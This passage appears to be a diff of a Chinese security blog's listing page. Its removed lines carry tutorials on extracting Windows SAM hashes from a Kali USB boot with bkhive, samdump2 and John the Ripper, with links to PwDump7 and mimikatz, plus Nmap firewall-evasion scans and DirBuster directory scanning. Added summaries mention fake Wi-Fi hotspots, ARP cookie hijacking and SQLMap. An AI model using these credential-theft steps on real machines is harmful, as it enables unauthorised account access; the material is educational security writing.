-<pre><code>net user Frank 1t2e3n /add
-net user Alice xy4567 /add
-</code></pre><p><strong>2、 提取SAM文件</strong></p>
-<p>将本机设置为U盘启动，插上U盘，进入kali</p>
-<p>打开我的电脑，点击Win7的系统盘图标，这时候kali已经把Win7系统盘（Win7OS）挂载到</p>
-<p>/media下，把/media/Win7OS/Windows/System32/config/下的SAM文件和SYSTEM文件复制出来，需要注意大小写</p>
-<p><strong>3、 提取hash散列</strong></p>
-<p>先用bkhive从SYSTEM文件生成一个bootkey文件</p>
-<p>再使用samdump2工具从SAM文件和bootkey中提取出hash散列</p>
-<pre><code>/*  在/tmp目录下执行  */
-bkhive SYSTEM bootkey
-samdump2 bootkey SAM &gt; hashes.txt
-</code></pre><p>hash散列就被保存在/tmp/hashes.txt中，格式如下：</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201410/252010458084913.png" alt=""></p>
-<p>现在windows的大多数操作系统已经使用NTLMv2加密方式，所以得到的LM散列一般没什么用（空字符加密的结果）上面的NTLM字符串就是我们想要得到的hash散列</p>
-<h2 id="0x-04-破解hash"><a href="#0x-04-破解hash" class="headerlink" title="0x 04 破解hash"></a>0x 04 破解hash</h2><p>如果原先明文密码长度在6位以内我们可以使用John the Ripper这款工具进行爆破，很简单的</p>
-<p>在本机测试的结果是不到一小时所有的6位长度的密码都可以破解成功</p>
-<pre><code>/* 在tmp目录下执行 */
-john hashes.txt --format=nt2  // nt2 表示使用NTLMv2破解方式
-</code></pre><p>然后就可以撸啊撸(xD)去了，让他自己跑呗(其实我去睡午觉了我会乱说~)</p>
-<p>在然后就没了，看截图</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201410/252021369188030.png" alt=""></p>
-<p>Frank 和 Alice的 password 已经出来~ </p>
-<p>大致的算了一下 john 破解NTMLv2的速度大致一秒钟100多万条吧</p>
-<p>所以说 跑个一个小时也没有结果建议网上解密，<br><a href="http://www.hashkiller.co.uk/" target="_blank" rel="external"><strong>hashkiller</strong></a>，<a href="http://www.cmd5.com/" target="_blank" rel="external"><strong>cmd5</strong></a> 都是不错的网站</p>
-<p>上面倒腾了一大堆，看着也够麻烦的，要是你瞟到了这里说明你赚了   ：)</p>
-<ul>
-<li>如果正常进入本机的话可以直接提取hash的，Windows下神器PwDump7在这，直接运行.exe就可以，地址贴在后面</li>
-<li>如果你想要直接获得本机账户密码的话，也可以，在桌面上运行mimikatz2，法国牛人写的，确实赞，不过报毒 ….</li>
-<li>如果拿到SYSTEM和SAM文件，在Windows下也有获取hash的工具 SAMInside，导入文件即可</li>
-<li>如果进不了也可以在CMD模式下COPY文件到U盘然后，取出hash破解</li>
-<li>当然，在这篇文件里写的都是破解登录密码，而非清除（重置）</li>
-<li>因为清除重置什么的和砸破窗户跳进去有什么区别… ：)</li>
-</ul>
-<p>工具下载：</p>
-<p>　　<strong>PwDump7</strong> 　　 百度网盘  <a href="http://pan.baidu.com/s/1kT9RcjX" target="_blank" rel="external">http://pan.baidu.com/s/1kT9RcjX</a> 密码: bb1s</p>
-<p>　　<strong>mimikatz2</strong>　　百度网盘  <a href="http://pan.baidu.com/s/1jGoouA6" target="_blank" rel="external">http://pan.baidu.com/s/1jGoouA6</a> 密码: iakf</p>
-<p>　　<strong>SANInside</strong> 　 百度网盘  <a href="http://pan.baidu.com/s/1D7jUu" target="_blank" rel="external">http://pan.baidu.com/s/1D7jUu</a> 密码: 91ud</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+<section class="post" itemscope itemprop="blogitem">
   
-  <span></span> <a href="/tags/kali/">kali</a><a href="/tags/密码破解/">密码破解</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2014/10/25/pojie-windows-login/#comments" class="ds-thread-count comments-count-link" data-thread-key="2014/10/25/pojie-windows-login/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2014/09/17/nmap/" title="Nmap 端口扫描利器" itemprop="url">Nmap 端口扫描利器</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2014-09-17T07:11:56.000Z" itemprop="datePublished"> Published 2014-09-17</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p><img src="http://images.cnitblog.com/blog/671902/201409/171914343316079.jpg" alt=""></p>
-<p>作为时下流行的端口扫描工具，Nmap有因其扫描的隐密性有“端口扫描之王”之称</p>
-<p>上图是黑客帝国（The Matrix）中崔妮蒂用Nmap入侵核发电站的能源管理系统</p>
-<h2 id="0x-00-Nmap介绍"><a href="#0x-00-Nmap介绍" class="headerlink" title="0x 00 Nmap介绍"></a>0x 00 Nmap介绍</h2><p>Nmap是一款用于网络发现和安全审计的安全工具，常用于端口扫描。</p>
-<p>用法： <strong>nmap [扫描类型] [参数] 目标IP</strong></p>
-<ol>
-<li>扫描类型</li>
-</ol>
-<p>　　　　<strong>-sT</strong>　　TCP 连接扫描，会在目标主机中记录大量的链接请求和错误信息</p>
-<p>　　　　<strong>-sS</strong>　　SYN扫描，只完成三次握手前两次，很少有系统记入日志，默认使用，需要root(admin)权限</p>
-<p>　　　　<strong>-sP</strong>　　Ping扫描，默认使用，只有能Ping得通才会继续扫描</p>
-<p>　　　　<strong>-P0</strong>　　扫描之前不需要Ping，用于绕过防火墙禁Ping功能</p>
-<p>　　　　<strong>-sA</strong>　　高级的扫描方式，用来穿过防火墙的规则集</p>
-<p>　　　　<strong>-sV</strong>　　探测端口号版本　</p>
-<p>　　　　<strong>-sU</strong>　　UDP扫描，扫描主机开启的UDP的服务，速度慢，结果不可靠　</p>
-<p>　　　　<strong>-sX -sN</strong> 　　秘密的FIN数据包扫描，圣诞树(Xmas Tree)和空模式，针对Unix和Linux主机，系统要求遵循TCP RFC文档</p>
-<h2 id="0x-01-扫描案例"><a href="#0x-01-扫描案例" class="headerlink" title="0x 01 扫描案例"></a>0x 01 扫描案例</h2><p>　　<strong>1. 扫描C段（局域网）存活主机</strong></p>
-<p>　　　　nmap -sP www.XXX.com/24</p>
-<p>　　　　nmap -sP 192.168.1.<em>  （注释：“</em>”为通配符）</p>
-<p>　　<strong>2. 扫描指定IP开放端口号</strong></p>
-<p>　　　　nmap -sS -p- -v 192.168.1.100</p>
-<p>　　　　-p-为全端口扫描，和[1-65535]一样，建议使用</p>
-<p>　　　　不使用默认Nmap认为危险的100个端口号</p>
-<p>　　<strong>3. 扫描指定IP所开端口及服务版本</strong></p>
-<p>　　　　nmap -sV -v 192.168.1.100</p>
-<p>　　<strong>4. 探测主机操作系统</strong></p>
-<p>　　　　nmap -O www.XXX.com</p>
-<p> 　　　　扫描准确度以百分比显示，未必准确</p>
-<p>　　<strong>5. 穿透防火墙扫描</strong></p>
-<p>　　　　nmap -P0  www.XXX.com</p>
-<p>　　<strong>6. 全面探测，-A包含OS 探测，版本探测，脚本扫描，traceroute</strong></p>
-<p>　　　　nmap -A www.XXX.com</p>
-<p>　　<strong>7. 使用脚本扫描</strong></p>
-<p>　　　　nmap –script=”脚本名称” www.XXX.com</p>
-<p>　　　　如在局域网上扫找 Conficker 蠕虫病毒</p>
-<p>　　　　nmap -PN -T4 -p139,445 -n -v –script=smb-check-vulns –script-args safe=1 192.168.0.1-254</p>
-<p>　　　　脚本放在Nmap安装目录script下，官网可查各个脚本功能</p>
-<p>多说两句 ~<br>有一款工具叫做 Zmap ，是定位于全球扫描的端口扫描，据说1小时可以扫描全球开了80端口的主机。这种东西怎么说呢，要不就舍弃细节做到高效率扫描比如Zmap，要不就注重细节，做到精细扫描，比如可以探测OS指纹，Web后端指纹，CMS框架，这两种不同的工具的作用领域不同而已，没什么好坏之分。<br>想要对 Nmap 深入了解，读读官方文档吧，会对你写一些扫描工具有帮助的 :)</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+    <a href="/2015/06/10/python-spider-subdomain-ip/" title="Python 爬虫获取指定主机子域名及IP信息" itemprop="url">
   
-  <span></span> <a href="/tags/Nmap/">Nmap</a><a href="/tags/端口扫描/">端口扫描</a><a href="/tags/安全工具/">安全工具</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2014/09/17/nmap/#comments" class="ds-thread-count comments-count-link" data-thread-key="2014/09/17/nmap/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
+    <h1 itemprop="name">Python 爬虫获取指定主机子域名及IP信息</h1>
     
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
+     
+           <p itemprop="description" >0x 00 前言前天自己在玩的时候，自己通过百度搜索主机的二级域名感觉好麻烦，自已要一页页的去翻
+而且人工识别是否是重复的二级域名也够蛋疼的，正好最近在学正则表达式，权当练手了
+2016年更新：发现了一些不错的扫子域名的网站，如下
+http://subdomain.chaxun.</p>
+        
     
-      <a href="/2014/09/16/find-dir/" title="目录扫描 DirBuster 与 御剑 使用Demo" itemprop="url">目录扫描 DirBuster 与 御剑 使用Demo</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2014-09-16T06:51:58.000Z" itemprop="datePublished"> Published 2014-09-16</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>　　要想熟悉目标网站的体系架构，知道网站有哪些目录是必不可少的<br>向AWVS，Burp类大型扫描工具也可以进行目录扫描，不过无论是目录扫描还是SQL 注入，综合型的工具远没有专业扫描工具来的简单，实在。　期待能有一个扫描器抓扫弱点URL资源的，好像已经有白帽子在开发了。</p>
-<h2 id="0x00-DirBuster"><a href="#0x00-DirBuster" class="headerlink" title="0x00 DirBuster"></a>0x00 DirBuster</h2><p>　　DirBuster是Owasp(开放Web软体安全项目- Open Web Application Security Project )开发的一款专门用于探测Web服务器的目录和隐藏文件。由于使用Java编写，电脑中要装有JDK才能运行。DirBuster 扫描二级目录的策略有两个：1，爬行网站；2，暴力破解。</p>
-<ol>
-<li>配置说明</li>
-</ol>
-<p>点击Options—Advanced Options打开如下配置界面</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201409/162109281289637.jpg" alt=""></p>
-<p>在这里可以设置不扫描文件类型，设置遇到表单自动登录，增加HTTP头（Cookie……），</p>
-<p>以及代理设置，超时链接设置，默认线程，字典，扩展名设置</p>
-<p>有时间的小伙伴自己捣鼓捣鼓 ，这里不多说了</p>
-<ol>
-<li>扫描测试</li>
-</ol>
-<p>本地搭建了一个Dede站，直接开撸</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201409/162103128002003.jpg" alt=""></p>
-<p>在第4步中也可以选择纯暴力破解模式，命中率不高，相比之下还是模糊测试好用些</p>
-<p>（坏笑~）上面有一个小错误，在第7步的时候，扫目标站下的目录应该填写/DedeCms5.7/{dir} 不知道细心的小伙伴发现了没~</p>
-<p>否则的话扫的就是127.0.0.1：8080下的目录了</p>
-<ol>
-<li>扫描结果</li>
-</ol>
-<p>这是本地扫描目录列表，点击TreeView可以自己查看目录树</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201409/162114165965209.jpg" alt=""></p>
-<p>　　　　　　</p>
-<h2 id="0x-01-御剑"><a href="#0x-01-御剑" class="headerlink" title="0x 01 御剑"></a>0x 01 御剑</h2><p>　　国内第一后台扫描神器,不用配置，御剑只会做字典扫描，不做爬虫扫描，填上网站，只需要点一下就够了，上图 </p>
-<p><img src="http://images.cnitblog.com/blog/671902/201409/162123493154341.jpg" alt=""></p>
-<p>简单粗暴，适合使用，期待御剑的其他作品。</p>
-<p><strong> Summary： </strong></p>
-<p>前面文章已经说过了，对于目录扫描我们可以手动查看robots.txt，说不定后台就放在里面。</p>
-<p>还是那句话，一个扫描器扫描结果不理想时，我们大可以两个扫描器一起上。工具是死的，要学会灵活使用 !</p>
-<p>一般来说一个靠谱的目录扫描器可以从两方面入手：</p>
-<ul>
-<li>爬行本网站以及搜索引擎的相关URL并做去重处理</li>
-<li>找一个靠谱的字典去做 fuzzing</li>
-</ul>
-<p>子域名探测和目录扫描的思路是一样的，对于子域名探测可以写个爬虫爬取专门探测子域名网站上的结果。</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
+    <time datetime="2015-06-10T09:09:11.000Z" itemprop="datePublished">2015-06-10</time>
+  </a>
+</section>
 
 
-  <div class="article-tags">
+
+
+
+
   
-  <span></span> <a href="/tags/安全工具/">安全工具</a><a href="/tags/DirBuster/">DirBuster</a><a href="/tags/御剑/">御剑</a><a href="/tags/目录扫描/">目录扫描</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2014/09/16/find-dir/#comments" class="ds-thread-count comments-count-link" data-thread-key="2014/09/16/find-dir/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2015/01/02/fake-wifi-ap/" title="搭建假冒 WIFI 热点等小(mei)白(zhi)兔(men)来蹭网啊 - -。" itemprop="url">
+  
+    <h1 itemprop="name">搭建假冒 WIFI 热点等小(mei)白(zhi)兔(men)来蹭网啊 - -。</h1>
+    
+     
+           <p itemprop="description" >0x 00 ╮(╯▽╰)╭　　　　请喊我万恶的标题党  哈哈哈哈哈
+0x 01 这里正题　　　　虚拟机（Kali）不支持内置网卡，还好我有神器，插上我的RT8187L，开始搞起
+　　　　参考资料：zone.wooyun.org/content/2562
+　　　　下面看攻击测试吧
+</p>
+        
+    
+    <time datetime="2015-01-02T08:58:22.000Z" itemprop="datePublished">2015-01-02</time>
+  </a>
+</section>
 
 
 
 
 
 
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2015/01/02/arpspoof/" title="内网 ARP 欺骗劫持 Cookie 登入百度" itemprop="url">
+  
+    <h1 itemprop="name">内网 ARP 欺骗劫持 Cookie 登入百度</h1>
+    
+     
+           <p itemprop="description" >0x 00 ARP欺骗说明欺骗原理相关内容就不多叙述了，Google一大堆
+实施ARP欺骗在 Windows 下， Linux 下都相关工具
+由于在 Linux 下可以开启 ip_forward 功能，个人认为 Linux 下的工具作用效果比较好，本次测试是在Kali（Linux</p>
+        
+    
+    <time datetime="2015-01-02T08:42:41.000Z" itemprop="datePublished">2015-01-02</time>
+  </a>
+</section>
 
-  <nav id="page-nav" class="clearfix">
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2014/11/26/sqlmap/" title="SQL注入利用神器 SQLMap 的介绍与 Demo" itemprop="url">
+  
+    <h1 itemprop="name">SQL注入利用神器 SQLMap 的介绍与 Demo</h1>
+    
+     
+           <p itemprop="description" >0x 00　前言正是SQLMAP这种神器的存在，SQL注入简直Easy到根本停不下来….
+PS：国内类似软件也有阿D，明小子，挖掘机，当你用过他们之后你才会发现SQLMap才是绝对的注入神器
+0x 01 注入原理存在注入的原因是因为后台在编写程序时，没有对用户输入的数据做过滤导致</p>
+        
+    
+    <time datetime="2014-11-26T08:05:01.000Z" itemprop="datePublished">2014-11-26</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2014/11/26/nessus/" title="Nessus 多功能扫描器" itemprop="url">
+  
+    <h1 itemprop="name">Nessus 多功能扫描器</h1>
+    
+     
+           <p itemprop="description" >0x 00 前言　　写这篇博客，证明我还活着……
+0x 01 安装Nessus　　直接官网  www.tenable.com/products/nessus/select-your-operating-system
+　　选择Nessus Home版下载，下载之后点击安装我这里是N</p>
+        
+    
+    <time datetime="2014-11-26T07:53:11.000Z" itemprop="datePublished">2014-11-26</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2014/10/25/pojie-windows-login/" title="破解 Windows 7/8 登录密码" itemprop="url">
+  
+    <h1 itemprop="name">破解 Windows 7/8 登录密码</h1>
+    
+     
+           <p itemprop="description" >// 文末有惊喜：）
+
+0x 00 破解思路用户的明文密码经过单向Hash加密生成Hash散列，Hash散列又被加密存放在系统盘\Windiws\System32\config文件下
+要获得明文就要先得到SAM文件，从中提取出hash散列，然后网上查询或者暴力破解获得明文密码
+　</p>
+        
+    
+    <time datetime="2014-10-25T07:27:16.000Z" itemprop="datePublished">2014-10-25</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2014/09/17/nmap/" title="Nmap 端口扫描利器" itemprop="url">
+  
+    <h1 itemprop="name">Nmap 端口扫描利器</h1>
+    
+     
+           <p itemprop="description" >作为时下流行的端口扫描工具，Nmap有因其扫描的隐密性有“端口扫描之王”之称
+上图是黑客帝国（The Matrix）中崔妮蒂用Nmap入侵核发电站的能源管理系统
+0x 00 Nmap介绍Nmap是一款用于网络发现和安全审计的安全工具，常用于端口扫描。
+用法： nmap [扫描类型</p>
+        
+    
+    <time datetime="2014-09-17T07:11:56.000Z" itemprop="datePublished">2014-09-17</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2014/09/16/find-dir/" title="目录扫描 DirBuster 与 御剑 使用Demo" itemprop="url">
+  
+    <h1 itemprop="name">目录扫描 DirBuster 与 御剑 使用Demo</h1>
+    
+     
+           <p itemprop="description" >要想熟悉目标网站的体系架构，知道网站有哪些目录是必不可少的向AWVS，Burp类大型扫描工具也可以进行目录扫描，不过无论是目录扫描还是SQL 注入，综合型的工具远没有专业扫描工具来的简单，实在。　期待能有一个扫描器抓扫弱点URL资源的，好像已经有白帽子在开发了。
+0x00 Dir</p>
+        
+    
+    <time datetime="2014-09-16T06:51:58.000Z" itemprop="datePublished">2014-09-16</time>
+  </a>
+</section>
+
+
+
+
+
+
+
+  <nav id="page-nav" class="clearfix unexpand">
     <a class="extend prev" rel="prev" href="/page/2/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next<span></span></a>
   </nav>
 
 </div>
-      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
 <aside class="clearfix">
 
   
 
   
 <div class="tagslist">
-	<p class="asidetitle">Tags</p>
+	<p class="asidetitle">标签</p>
 		<ul class="clearfix">
 		
 			
@@ -1229,7 +400,7 @@ john hashes.txt --format=nt2  // nt2 表示使用NTLMv2破解方式
 
 
   <div class="linkslist">
-  <p class="asidetitle">Links</p>
+  <p class="asidetitle">友情链接</p>
     <ul>
         
           <li>
@@ -1253,11 +424,8 @@ john hashes.txt --format=nt2  // nt2 表示使用NTLMv2破解方式
     </ul>
 </div>
 
-  
-
-
   <div class="rsspart">
-	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
 </div>
 
 </aside>
@@ -1397,7 +565,7 @@ $(document).ready(function(){
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
